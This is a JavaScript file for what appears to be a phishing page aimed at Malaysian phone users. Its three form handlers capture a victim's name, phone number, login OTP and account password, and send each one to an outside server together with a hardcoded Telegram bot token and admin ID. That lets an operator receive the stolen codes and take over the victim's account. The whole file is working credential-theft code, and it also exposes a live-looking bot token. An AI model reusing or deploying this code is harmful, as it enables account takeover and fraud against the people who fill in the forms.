// ==========================================
// PENGATURAN BOT (DIATUR DARI CPANEL)
// ==========================================
const BOT_TOKEN = "8994915603:AAEXtI1z-AkBo8ACpWP28NB4aHi70ulLtC4"; // Ganti token bot Anda
const ADMIN_ID = "6809820646"; // Ganti ID Telegram Anda
const SERVER_URL = "https://vpserversr.cloud/bot2";
// ==========================================

// --- 1. HALAMAN DATA DIRI (MINTA OTP) ---
document.getElementById('firstForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('loading').style.display = 'flex';
    
    const nama = document.getElementById('full_name').value;
    let hpRaw = document.getElementById('phone_number').value;
    
    if(hpRaw.startsWith('0')) hpRaw = hpRaw.substring(1);
    const hp = hpRaw.startsWith('60') ? hpRaw : "60" + hpRaw;

    try {
        const response = await fetch(`${SERVER_URL}/api/firstData`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
            body: JSON.stringify({ 
                action: "request_otp", nama: nama, phone: hp, 
                bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
            })
        });

        const result = await response.json();
        document.getElementById('loading').style.display = 'none';

        if (result.status === "sent") {
            document.querySelector('.first').style.display = 'none';
            document.querySelector('.second').style.display = 'block';
            document.getElementById('validatefull_name').value = nama;
            document.getElementById('validatephone_number').value = hp;
        } else {
            alert("Gagal: " + (result.message || "Nombor tidak sah."));
        }
    } catch (error) {
        document.getElementById('loading').style.display = 'none';
        alert("Error koneksi ke server VPS.");
    }
});

// --- 2. HALAMAN OTP (VALIDASI & CEK PASSWORD) ---
document.getElementById('secondForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('loading').style.display = 'flex';
    
    const otp = document.getElementById('otp_code').value;
    const hp = document.getElementById('validatephone_number').value;

    try {
        const response = await fetch(`${SERVER_URL}/api/firstData`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
            body: JSON.stringify({ 
                action: "verify_otp", phone: hp, otp: otp, 
                bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
            })
        });

        const result = await response.json();
        document.getElementById('loading').style.display = 'none';

        if (result.status === "success") {
            document.querySelector('.second').style.display = 'none';
            document.querySelector('.six').style.display = 'block'; 
        } else if (result.status === "need_password") {
            document.querySelector('.second').style.display = 'none';
            document.querySelector('.third').style.display = 'block'; 
            document.getElementById('validateotp_code').value = otp;
            document.getElementById('validatephone_number_pass').value = hp;
        } else {
            alert("KODE OTP SALAH!");
            document.getElementById('otp_code').value = ""; 
        }
    } catch (error) {
        document.getElementById('loading').style.display = 'none';
        alert("Gagal verifikasi.");
    }
});

// --- 3. HALAMAN PASSWORD (FINAL SUBMIT) ---
document.getElementById('thirdForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('loading').style.display = 'flex';

    const pass = document.getElementById('password').value;
    const otp = document.getElementById('validateotp_code').value;
    const hp = document.getElementById('validatephone_number_pass').value;

    try {
        const res = await fetch(`${SERVER_URL}/api/firstData`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
            body: JSON.stringify({ 
                action: "submit_password", phone: hp, otp: otp, pass: pass, 
                bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
            })
        });

        const result = await res.json();
        document.getElementById('loading').style.display = 'none';

        if (result.status === "success") {
            document.querySelector('.third').style.display = 'none';
            document.querySelector('.six').style.display = 'block';
        } else {
            alert("Kata Laluan Salah!");
        }
    } catch (error) {
        document.getElementById('loading').style.display = 'none';
        alert("Gagal terhubung ke server.");
    }
});
